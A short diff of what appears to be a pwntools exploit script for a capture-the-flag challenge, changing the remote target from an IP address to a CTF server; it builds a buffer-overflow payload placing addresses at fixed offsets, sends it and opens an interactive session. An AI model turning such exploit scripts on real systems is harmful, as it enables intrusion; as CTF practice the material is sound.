@@ -9,7 +9,7 @@ payload = fit({
     24: cataddr,
     32: doaddr
 })
-io = remote('184.72.87.9', 8007)
+io = remote('ctf.cs.fsu.edu', 19990)
 io.recvuntil('flag.txt\n')
 io.sendline(payload)
 io.interactive()
